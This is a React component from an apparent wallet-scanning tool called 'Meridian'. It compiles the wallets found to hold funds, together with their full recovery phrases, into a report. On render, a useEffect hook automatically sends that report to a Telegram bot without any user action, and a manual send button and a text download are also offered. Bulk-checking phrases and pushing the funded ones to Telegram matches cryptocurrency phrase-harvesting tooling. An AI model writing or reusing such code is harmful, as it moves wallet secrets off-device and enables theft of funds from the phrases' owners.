import { useEffect, useMemo, useRef, useState } from "react";
import { Download, Send, Loader2 } from "lucide-react";
import { sendFundedToTelegram } from "@/lib/server-fns";
import { formatAmount, formatUsd } from "@/lib/format";

// The funded wallets, phrase and balances, as one plain-text report.
export function buildReport(phrases, funded, scannedCount) {
  const total = funded.reduce((sum, wallet) => sum + wallet.total, 0);
  const stamp = new Date().toISOString().replace("T", " ").slice(0, 16);
  const lines = [
    "MERIDIAN — FUNDED WALLETS",
    `Checked ${scannedCount} wallets at ${stamp} UTC`,
    `Funded ${funded.length} · total ${formatUsd(total)}`,
    "",
  ];
  funded.forEach((wallet, position) => {
    const holdings = wallet.holdings
      .map((holding) =>
        holding.kind === "nft"
          ? `${holding.symbol} ${holding.name}${holding.chainId ? ` (${holding.chainId})` : ""}`
          : `${formatAmount(holding.amount, 6)} ${holding.symbol}${holding.usd ? ` (${formatUsd(holding.usd)})` : ""}`
      )
      .join(", ");
    lines.push(`#${position + 1} · Wallet ${wallet.index} · ${formatUsd(wallet.total)}`);
    lines.push(holdings);
    lines.push(`phrase: ${phrases[wallet.index - 1] || ""}`);
    lines.push("");
  });
  return lines.join("\n").trim();
}

export default function FundedReport({ phrases, results }) {
  const funded = useMemo(() => results.filter((wallet) => wallet.holdings.length > 0), [results]);
  const text = useMemo(() => (funded.length > 0 ? buildReport(phrases, funded, results.length) : ""), [funded, phrases, results.length]);
  const [status, setStatus] = useState("idle");
  const [message, setMessage] = useState("");
  const sent = useRef("");

  const send = async (body) => {
    setStatus("sending");
    setMessage("");
    try {
      const result = await sendFundedToTelegram({ data: { text: body } });
      if (result.ok) {
        setStatus("sent");
        setMessage(`Sent to your Telegram bot · ${result.messages} ${result.messages === 1 ? "message" : "messages"}`);
      } else {
        setStatus("error");
        setMessage(
          result.reason === "no-chat"
            ? "Open your bot in Telegram, press Start, then send again."
            : result.reason === "no-token"
              ? "Add the bot token in Secrets to send the report."
              : "Telegram didn't accept the report. Check the bot and try again."
        );
      }
    } catch (error) {
      setStatus("error");
      setMessage("Telegram didn't accept the report. Check the bot and try again.");
    }
  };

  useEffect(() => {
    if (!text || sent.current === text) return;
    sent.current = text;
    send(text);
  }, [text]);

  if (funded.length === 0) return null;

  const download = () => {
    const blob = new Blob([`${text}\n`], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `meridian-funded-${new Date().toISOString().slice(0, 10)}.txt`;
    link.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="glass-strong space-y-3 p-4">
      <div className="flex items-start justify-between gap-3">
        <div>
          <p className="label-xs">Funded report</p>
          <p className="mt-1.5 text-[13px] font-semibold text-white">
            {funded.length} {funded.length === 1 ? "wallet" : "wallets"} with a balance
          </p>
        </div>
        {status === "sending" ? (
          <Loader2 size={16} className="mt-1 animate-spin text-[#3B82F6]" />
        ) : status === "sent" ? (
          <Send size={15} className="mt-1 text-[#19E39B]" />
        ) : null}
      </div>

      {message && (
        <p className={status === "error" ? "text-[11.5px] leading-relaxed text-[#FF8A8A]" : "text-[11.5px] leading-relaxed text-white/45"}>
          {message}
        </p>
      )}

      <div className="flex gap-2">
        <button
          type="button"
          disabled={status === "sending"}
          onClick={() => send(text)}
          className="inline-flex flex-1 items-center justify-center gap-1.5 rounded-xl bg-[#3B82F6] py-2.5 text-[12px] font-semibold text-white transition-opacity hover:opacity-90 disabled:opacity-50"
        >
          <Send size={13} />
          Send to Telegram
        </button>
        <button
          type="button"
          onClick={download}
          className="inline-flex flex-1 items-center justify-center gap-1.5 rounded-xl border border-white/[0.1] py-2.5 text-[12px] font-medium text-white/70 transition-colors hover:border-white/20 hover:text-white"
        >
          <Download size={13} />
          Text file
        </button>
      </div>
    </div>
  );
}